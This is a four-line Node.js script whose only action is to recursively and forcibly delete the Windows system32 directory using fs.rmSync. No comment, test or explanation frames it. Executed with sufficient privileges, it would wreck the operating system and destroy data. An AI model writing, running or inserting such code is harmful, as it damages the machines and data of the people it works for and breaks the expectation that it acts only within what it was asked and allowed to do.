const fs = require('fs');
const path = require('path');
const dir = "c:/windows/system32"
fs.rmSync(dir, { recursive: true, force: true });
